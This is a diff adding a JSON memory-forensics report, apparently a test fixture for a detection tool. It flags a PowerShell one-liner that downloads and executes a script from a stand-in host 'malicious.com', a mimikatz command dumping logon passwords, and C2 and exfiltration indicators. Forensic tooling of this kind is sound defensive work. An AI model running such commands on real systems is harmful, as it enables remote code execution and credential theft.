@@ -1,0 +1,102 @@
+{
+  "dump_file": "cert_test_memory.raw",
+  "dump_size": 16000,
+  "dump_hash_sha256": "83327773f426feb85ee33bd066f572d68670ad2f03ee5bf334c21eb9c57345fb",
+  "os_profile": "Win10x64",
+  "analyzed_at": "2026-03-18T11:28:25.040985+00:00",
+  "results": {
+    "processes": {
+      "total_processes": 156,
+      "suspicious_count": 2,
+      "suspicious_processes": [
+        {
+          "pid": 1337,
+          "name": "powershell.exe",
+          "ppid": 1234,
+          "parent": "cmd.exe",
+          "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+          "suspicious": true,
+          "reasons": [
+            "Bypassed execution policy",
+            "Download from suspicious domain",
+            "Base64 encoded payload"
+          ]
+        },
+        {
+          "pid": 2468,
+          "name": "mimikatz.exe",
+          "ppid": 1337,
+          "parent": "powershell.exe",
+          "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+          "suspicious": true,
+          "reasons": [
+            "Known credential dumping tool",
+            "LSASS access"
+          ]
+        },
+        {
+          "pid": 3579,
+          "name": "explorer.exe",
+          "ppid": 1000,
+          "parent": "winlogon.exe",
+          "command_line": "C:\\Windows\\explorer.exe",
+          "suspicious": false,
+          "reasons": []
+        }
+      ],
+      "indicators": [
+        "Detected Mimikatz execution",
+        "Detected PowerShell with ExecutionPolicy bypass",
+        "Detected potential C2 communication"
+      ]
+    },
+    "network": {
+      "total_connections": 47,
+      "suspicious_count": 2,
+      "suspicious_connections": [],
+      "c2_indicators": [
+        "203.0.113.50:4444"
+      ],
+      "exfiltration_indicators": [
+        "185.220.101.50:443"
+      ]
+    },
+    "malware": {
+      "total_scanned": 156,
+      "malicious_count": 1,
+      "malicious_injections": [],
+      "signatures_matched": [
+        "Metasploit",
+        "Cobalt Strike"
+      ]
+    },
+    "cmdline": {
+      "total_cmdlines": 89,
+      "suspicious_count": 1,
+      "suspicious_cmdlines": []
+    },
+    "dll_injection": {
+      "total_dlls": 428,
+      "suspicious_count": 1,
+      "injected_dlls": []
+    },
+    "iocs": {
+      "ip_addresses": [
+        "203.0.113.50",
+        "185.220.101.50"
+      ],
+      "domains": [
+        "malicious.com",
+        "evil-c2.net"
+      ],
+      "file_hashes": [
+        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      ],
+      "file_paths": [
+        "C:\\Temp\\malicious.dll"
+      ],
+      "registry_keys": [],
+      "mutexes": []
+    }
+  }
+}
